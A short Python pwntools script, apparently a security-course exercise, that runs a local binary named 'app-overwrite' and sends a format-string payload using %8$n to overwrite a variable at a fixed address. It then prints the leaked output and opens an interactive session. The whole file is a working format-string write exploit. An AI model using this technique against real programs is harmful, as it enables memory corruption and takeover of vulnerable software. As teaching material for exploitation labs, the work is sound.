from pwn import * 
def fora(): 
    sh = process('./app-overwrite') 
    a_addr =  0x0804c028 # address of a 
    # format string â€“ change to your answer 
    # [additional format]%<m-1>$n[padding][overwrite addr]
    payload = b'aa%8$naa' + p32(a_addr)
    sh.sendline(payload) 
    res = sh.recv().split(b'\n')
    print('Payload: ',payload)
    print('Leaked demo:', res[0])
    print('Format string leak:', res[1])
    print('Output:', b'\n'.join(res[2:]).decode('utf-8')) 
    sh.interactive() 
fora() 